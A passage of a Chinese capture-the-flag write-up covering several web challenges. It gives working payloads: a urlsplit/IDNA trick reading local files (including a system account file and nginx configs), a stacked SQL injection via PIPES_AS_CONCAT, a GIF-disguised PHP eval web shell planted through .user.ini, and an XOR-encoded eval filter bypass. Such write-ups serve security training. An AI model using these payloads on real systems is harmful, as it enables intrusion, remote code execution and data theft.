class=\"title\">urlunsplit</span><span class=\"params\">(components)</span>:</span></span><br><span class=\"line\">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class=\"line\">                                          _coerce_args(*components))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> netloc <span class=\"keyword\">or</span> (scheme <span class=\"keyword\">and</span> scheme <span class=\"keyword\">in</span> uses_netloc <span class=\"keyword\">and</span> url[:<span class=\"number\">2</span>] != <span class=\"string\">'//'</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> url <span class=\"keyword\">and</span> url[:<span class=\"number\">1</span>] != <span class=\"string\">'/'</span>: url = <span class=\"string\">'/'</span> + url</span><br><span class=\"line\">        url = <span class=\"string\">'//'</span> + (netloc <span class=\"keyword\">or</span> <span class=\"string\">''</span>) + url</span><br><span class=\"line\">    <span class=\"keyword\">if</span> scheme:</span><br><span class=\"line\">        url = scheme + <span class=\"string\">':'</span> + url</span><br><span class=\"line\">    <span class=\"keyword\">if</span> query:</span><br><span class=\"line\">        url = url + <span class=\"string\">'?'</span> + query</span><br><span class=\"line\">    <span class=\"keyword\">if</span> fragment:</span><br><span class=\"line\">        url = url + <span class=\"string\">'#'</span> + fragment</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>\n\n<p>这个函数的作用就是如果截取的URL（也就是path的位置）包含//就不再处理path。</p>\n<p>也就是<code>scheme:////netloc/path;parameters?query#fragment</code>经过urlsplite处理后会变成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scheme&#x3D;&#39;scheme&#39;, netloc&#x3D;&#39;&#39;, path&#x3D;&#39;&#x2F;&#x2F;netloc&#x2F;path;parameters&#39;, query&#x3D;&#39;query&#39;, fragment&#x3D;&#39;fragment&#39;</span><br></pre></td></tr></table></figure>\n\n<p>再经过urlunsplit处理后会变成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scheme:&#x2F;&#x2F;netloc&#x2F;path;parameters?query#fragment</span><br></pre></td></tr></table></figure>\n\n<p>如果传入的url是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>\n\n<p>会返回主机的用户记录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:*:17647:0:99999:7:::</span><br><span class=\"line\">daemon:*:17647:0:99999:7:::</span><br><span class=\"line\">bin:*:17647:0:99999:7:::</span><br><span class=\"line\">sys:*:17647:0:99999:7:::</span><br><span class=\"line\">sync:*:17647:0:99999:7:::</span><br><span class=\"line\">games:*:17647:0:99999:7:::</span><br><span class=\"line\">man:*:17647:0:99999:7:::</span><br><span class=\"line\">lp:*:17647:0:99999:7:::</span><br><span class=\"line\">mail:*:17647:0:99999:7:::</span><br><span class=\"line\">news:*:17647:0:99999:7:::</span><br><span class=\"line\">uucp:*:17647:0:99999:7:::</span><br><span class=\"line\">proxy:*:17647:0:99999:7:::</span><br><span class=\"line\">www-data:*:17647:0:99999:7:::</span><br><span class=\"line\">backup:*:17647:0:99999:7:::</span><br><span class=\"line\">list:*:17647:0:99999:7:::</span><br><span class=\"line\">irc:*:17647:0:99999:7:::</span><br><span class=\"line\">gnats:*:17647:0:99999:7:::</span><br><span class=\"line\">nobody:*:17647:0:99999:7:::</span><br><span class=\"line\">_apt:*:17647:0:99999:7:::</span><br><span class=\"line\">nginx:!:17708:0:99999:7:::</span><br></pre></td></tr></table></figure>\n\n<p>查看配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/66\" alt=\"\"></p>\n<p>查看网站配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    location &#x2F; &#123;</span><br><span class=\"line\">        try_files $uri @app;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location @app &#123;</span><br><span class=\"line\">        include uwsgi_params;</span><br><span class=\"line\">        uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location &#x2F;static &#123;</span><br><span class=\"line\">        alias &#x2F;app&#x2F;static;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    # location &#x2F;flag &#123;</span><br><span class=\"line\">    #     alias &#x2F;usr&#x2F;fffffflag;</span><br><span class=\"line\">    # &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>提示flag再 /usr/fffffflag 中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;b692ca82-8292-4582-846a-286b3743f697&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>预期解</strong><br>black hat 上的所展示的部分字符<br><img src=\"/pic/69.png\" alt=\"\"></p>\n<p>Altman师傅写的脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># coding:utf-8 </span><br><span class=\"line\">for i in range(128,65537):    </span><br><span class=\"line\">    tmp&#x3D;chr(i)    </span><br><span class=\"line\">    try:        </span><br><span class=\"line\">        res &#x3D; tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)        </span><br><span class=\"line\">        if(&quot;-&quot;) in res:            </span><br><span class=\"line\">            continue        </span><br><span class=\"line\">        print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))    </span><br><span class=\"line\">    except:        </span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure>\n\n\n<p>可以使用<strong>U+2102，ℂ</strong>代替c，或者<strong>U+2106, ℆</strong>代替c/u</p>\n<p>读取网站配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.ℂℂ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class=\"line\">或者</span><br><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>读取flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.cℂ&#x2F;usr&#x2F;fffffflag</span><br><span class=\"line\">或者</span><br><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h2><p>拿到题目是一个输入框，post类型提交</p>\n<p>先fuzz一遍，以下关键字被过滤</p>\n<p><img src=\"/pic/68.png\" alt=\"\"></p>\n<p><strong>非预期解</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*,1</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; [1] &#x3D;&gt; 1 )</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>预期解</strong></p>\n<p>根据测试发现输入长度最大为40个字符</p>\n<p>还发现存在堆叠注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases;#</span><br><span class=\"line\"> </span><br><span class=\"line\">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; ctf ) Array ( [0] &#x3D;&gt; ctftraining ) Array ( [0] &#x3D;&gt; information_schema ) Array ( [0] &#x3D;&gt; mysql ) Array ( [0] &#x3D;&gt; performance_schema ) Array ( [0] &#x3D;&gt; test )</span><br></pre></td></tr></table></figure>\n\n<p>经过测试查询语句应该类似于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select $_POST[&#39;query&#39;] || flag ...</span><br></pre></td></tr></table></figure>\n\n<p>关于<a href=\"https://mariadb.com/kb/en/sql-mode/\" target=\"_blank\" rel=\"noopener\">sql_mod</a></p>\n<p>当设置sql_mode=<strong>PIPES_AS_CONCAT</strong>时，将”||”视为字符串的连接操作符而非或运算符，这和 Oracle 数据库是一样的，也和字符串的拼接函数 Concat 相类似</p>\n<p>所以payload为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>\n\n<p>返结果为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; 1flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; )</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"CheckIn\"><a href=\"#CheckIn\" class=\"headerlink\" title=\"CheckIn\"></a>CheckIn</h2><p>先直接上传图片马，提示文件内容包含<code>&lt;?</code>，采用js的写法绕过</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=<span class=\"string\">\"php\"</span>&gt; </span><br><span class=\"line\"><span class=\"built_in\">eval</span>($_POST[cmd]);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>改后缀为PHP、PHP2、PHP3、PHP4、PHP5、Phtml，发现都被过滤</p>\n<p>php有一个文件是<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" target=\"_blank\" rel=\"noopener\">.user.ini</a>    <a href=\"[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)\">参考连接</a></p>\n<p><img src=\"/pic/70\" alt=\"\"></p>\n<p>先上传一个图片马</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Disposition</span>: form-data; name=\"fileUpload\"; filename=\"1.gif\"</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: image/gif</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">GIF89a</span></span><br><span class=\"line\">&lt;script language=\"php\"&gt; </span><br><span class=\"line\"><span class=\"attribute\">eval($_POST[cmd]);</span></span><br><span class=\"line\"><span class=\"attribute\">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>上传.htaccess发现没有生效，然后上传.user.ini</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;1.gif&quot;</span><br><span class=\"line\">Content-Type: image&#x2F;gif</span><br><span class=\"line\"></span><br><span class=\"line\">GIF89a</span><br><span class=\"line\">auto_prepend_file&#x3D;1.gif</span><br></pre></td></tr></table></figure>\n\n<p>auto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif</p>\n<p>返回信息</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Upload Labs<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Upload Labs<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"index.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"file\"</span>&gt;</span>文件名：<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"fileUpload\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"file\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"upload\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"提交\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Your dir uploads/2c67ca1eaeadbdc1868d67003072b481 <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>Your files : <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>array(5) &#123;</span><br><span class=\"line\">  [0]=&gt;</span><br><span class=\"line\">  string(1) \".\"</span><br><span class=\"line\">  [1]=&gt;</span><br><span class=\"line\">  string(2) \"..\"</span><br><span class=\"line\">  [2]=&gt;</span><br><span class=\"line\">  string(9) \".user.ini\"</span><br><span class=\"line\">  [3]=&gt;</span><br><span class=\"line\">  string(5) \"1.gif\"</span><br><span class=\"line\">  [4]=&gt;</span><br><span class=\"line\">  string(9) \"index.php\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用蚁剑连接<code>host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php</code>即可</p>\n<p><img src=\"/pic/71.png\" alt=\"\"></p>\n<h2 id=\"EasyWeb\"><a href=\"#EasyWeb\" class=\"headerlink\" title=\"EasyWeb\"></a>EasyWeb</h2><p>打开题目就是源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_the_flag</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class=\"line\">    $userdir = <span class=\"string\">\"upload/tmp_\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!file_exists($userdir))&#123;</span><br><span class=\"line\">    mkdir($userdir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_FILES[<span class=\"string\">\"file\"</span>]))&#123;</span><br><span class=\"line\">        $tmp_name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"tmp_name\"</span>];</span><br><span class=\"line\">        $name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"name\"</span>];</span><br><span class=\"line\">        $extension = substr($name, strrpos($name,<span class=\"string\">\".\"</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/ph/i\"</span>,$extension)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(mb_strpos(file_get_contents($tmp_name), <span class=\"string\">'&lt;?'</span>)!==<span class=\"keyword\">False</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exif_imagetype($tmp_name)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        $path= $userdir.<span class=\"string\">\"/\"</span>.$name;</span><br><span class=\"line\">        @move_uploaded_file($tmp_name, $path);</span><br><span class=\"line\">        print_r($path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$hhh = @$_GET[<span class=\"string\">'_'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$hhh)&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($hhh)&gt;<span class=\"number\">18</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'One inch long, one inch strong!'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( preg_match(<span class=\"string\">'/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i'</span>, $hhh) )</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Try something else!'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$character_type = count_chars($hhh, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($character_type)&gt;<span class=\"number\">12</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"Almost there!\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">eval</span>($hhh);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>首先要绕过长度，然后是绕过正则。</p>\n<p>绕过长度可以新建一个变量，可以使用异或或者非运算绕过。（~操作要比异或简单，但是被禁用，可以使用异或运算模拟非运算）</p>\n<p>异或构造$<em>GET[‘\\</em>‘]</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo urlencode(urldecode(&quot;%ff%ff%ff%ff&quot;)^&quot;_GET&quot;); &#x2F;&#x2F;%A0%B8%BA%AB</span><br></pre></td></tr></table></figure>\n\n<p>payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>查看phpinfo禁用了如下函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure>\n\n<p>还设置了<code>open_basedir</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">open_basedir\t&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_the_flag</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class=\"line\">    $userdir = <span class=\"string\">\"upload/tmp_\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!file_exists($userdir))&#123;</span><br><span class=\"line\">    mkdir($userdir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_FILES[<span class=\"string\">\"file\"</span>]))&#123;</span><br><span class=\"line\">        $tmp_name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"tmp_name\"</span>];</span><br><span class=\"line\">        $name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"name\"</span>];</span><br><span class=\"line\">        $extension = substr($name, strrpos($name,<span class=\"string\">\".\"</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/ph/i\"</span>,$extension)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(mb_strpos(file_get_contents($tmp_name), <span class=\"string\">'&lt;?'</span>)!==<span class=\"keyword\">False</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exif_imagetype($tmp_name)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        $path= $userdir.<span class=\"string\">\"/\"</span>.$name;</span><br><span class=\"line\">        @move_uploaded_file($tmp_name, 